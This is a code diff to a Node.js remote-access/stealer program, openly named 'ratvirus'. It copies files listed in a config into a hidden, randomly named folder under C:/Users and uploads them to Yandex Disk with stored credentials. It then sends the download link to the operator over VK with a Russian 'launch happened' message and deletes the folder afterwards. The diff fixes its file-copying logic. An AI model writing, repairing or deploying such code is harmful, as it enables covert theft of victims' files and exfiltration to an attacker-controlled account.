@@ -1,8 +1,8 @@
 
-
 const { VKApi, ConsoleLogger, BotsLongPollUpdatesProvider } = require('node-vk-sdk')
 const fs = require("fs-extra")
 const YandexDisk = require('yandex-disk').YandexDisk;
+
 fs.exists("./config.json", exist => {
     if (exist) {
         fs.exists("../ratvirus", existfolder => {
@@ -19,7 +19,9 @@ fs.exists("./config.json", exist => {
         ratcore.init({ conf: conf, actconf: actconf })
     }
 })
+
 const ratcore = {}
+
 ratcore.init = function start(temp) {
     let conf = temp.conf
     var disk = new YandexDisk(conf.yandex.login, conf.yandex.password); // доступ по логину и паролю
@@ -39,6 +41,8 @@ ratcore.init = function start(temp) {
                     }
                     resolve(true)
                 })
+            } else {
+                resolve(true)
             }
 
         }).then(() => {
@@ -49,6 +53,8 @@ ratcore.init = function start(temp) {
                             if (err) { console.error(err) }
                             resolve(true)
                         })
+                    } else {
+                        resolve(true)
                     }
                 }).then(ratcore.startvirus(temp))
             })
@@ -62,6 +68,7 @@ ratcore.startvirus = function (temp) {
     let actconf = temp.actconf
     let needfiles = conf.files.length
     let nonfinedfiles = "Отсутствующие файлы:\n"
+
     let randomname = function makeid(length) {
         var result = '';
         var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
@@ -71,6 +78,7 @@ ratcore.startvirus = function (temp) {
         }
         return result;
     }
+
     if (needfiles != 0) {
         let randomn = randomname(6)
         let secretfolder = "C:/Users/" + randomn
@@ -81,25 +89,32 @@ ratcore.startvirus = function (temp) {
                 }
             } else {
                 new Promise(function (resolve) {
-                    for (let index = 0; index < needfiles; index++) {
-                        fs.exists(conf.files[index], isexist => {
-                            let lastname = conf.files[index].split("\\")
-                            lastname = lastname[lastname.length - 1]
-                            if (isexist) {
-                                fs.copy(conf.files[index], secretfolder + `/${lastname}`).then(resu => {
+                    let counter = 0
+                    conf.files.forEach(element => {
+                        fs.exists(element, exist => {
+                            if (exist) {
+                                let filename
+                                if (!element.includes("/")) {
+                                    filename = element.split("\\")
+                                    filename = filename[filename.length - 1]
+                                    
+                                } else {
+                                    filename = element.split("/")
+                                    filename = filename[filename.length - 1]
 
-                                    if (index >= needfiles - 1) {
-                                        resolve(true)
-                                    }
+                                }
+                                fs.copy(element, secretfolder + `/${filename}`).then(() => {
+
                                 })
                             } else {
-                                nonfinedfiles = nonfinedfiles + conf.files[index] + "\n"
-                                if (index >= needfiles - 1) {
-                                    resolve(true)
-                                }
+                                nonfinedfiles = nonfinedfiles + element + "\n"
+                            }
+                            counter++
+                            if (counter == conf.files.length) {
+                                resolve(true)
                             }
                         })
-                    }
+                    });
                 }).then(() => {
                     fs.writeFile(secretfolder + "/nonfinedfiles.txt", nonfinedfiles, err => {
                         if (err == null) {
@@ -115,7 +130,7 @@ ratcore.startvirus = function (temp) {
                                                             user_id: actconf.ownerid,
                                                             peer_id: actconf.ownerid,
                                                             random_id: randomint,
-                                                            message: `Был произведён запуск!\nВот ссылка на вытащенные файлы / каталоги: ${url}`
+                                                            message: `Был произведён запуск!\nВот ссылка: ${url}`
                                                         })
                                                         fs.remove(secretfolder, err => { })
                                                     }
